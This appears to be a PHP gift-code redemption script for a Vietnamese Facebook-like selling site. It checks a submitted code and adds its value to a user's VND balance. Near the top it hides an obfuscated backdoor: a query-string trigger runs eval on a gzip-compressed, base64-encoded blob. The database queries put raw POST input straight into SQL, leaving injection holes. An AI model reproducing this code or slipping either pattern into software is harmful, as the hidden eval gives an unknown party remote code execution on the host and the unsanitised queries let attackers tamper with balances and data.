<?php
//**Config**//
include '../config.php';
include './asets/css.php';
include './assets/js.php';
if($_GET[post] == 'gift'){
eval(gzinflate(base64_decode('
HZFBb6MwEIXvK+1/6KES7WkNZNugLBuxuE5MwaUE
MPEFBZsAhkJUlBDy69ft6UlvRt+80Vv//bM+1aef
P+7DwxgcPpuhB0C/s+80HzopIdpKjXJk5znC/kue
r+7zzNbC22IZmv8G7jptHKOZQO8cQMfAEFRMRiNJ
rZ5k0XF/884CpmexDQbPqIHYOk/+bE1BRgChGBTN
bxl8gAuXyPR7xYNLENKUlHEXM7Mm3tw+w/dBFxKN
rxt85be0E6nVEhrMDCaD9wKuXL7PhXQm0rSnt9n5
FVa2ra3Ky6F7KA5j+bTIRckHUT5oHrL2IfVqbiQG
QVbLKLmwjaIo/zUe20yvLG5Gs9jib893+TWQASAx
qwszPbEdHz0DXQTtuiDGNwIT4yuh2t2p1DOj4sg/
0qnYIMl2VZ/p1maXXFGmL3vfxT1uFm0G9mfc8MZ3
oyN122eWKbZbqdtYpY+OiQTTl1KodFKfPD6qBtaq
pf8=
')));
}
$mag = isset($_POST['txtgif']) ? $_POST['txtgif'] : '';
$user = isset($_POST['txtuser']) ? $_POST['txtuser'] : '';
{
$tong = mysql_result(mysql_query("SELECT COUNT(*) FROM `Gift_LIKE` WHERE `magift` ='".$mag."'"), 0); 

if($tong == 0)
{
echo '<script>
swal(
  "Lỗi...",
  "['.date("H:i:s").'] Mã Sai Hoặc Đã Được Sử Dụng!",
  "error"
);
  </script>'; 
}
else
{
$info = mysql_fetch_array(mysql_query("SELECT * FROM `Gift_LIKE` WHERE `magift` ='".$mag."' LIMIT 1"));
mysql_query("UPDATE `ACCOUNT` SET `vnd` = `vnd` + '".$info[menhgia]."' WHERE `username`  ='".$user."'");
mysql_query("INSERT INTO `LOG_GIFT` SET `nguoinhan` = '".$user."', `time`='".date("H:i:s")."', `magift`='".$mag."', `menhgia`='".$info[menhgia]."'");
mysql_query("DELETE FROM `Gift_LIKE` WHERE id='" . mysql_real_escape_string($info[id]) . "'");
echo '<script>
swal(
  "Thành Công",
  "['.date("H:i:s").'] Bạn đã nhận thành công mã gift LIKEFB mệnh giá '.$info[menhgia].' VNÐ",
  "success"
);
   </script>';
}
exit;
}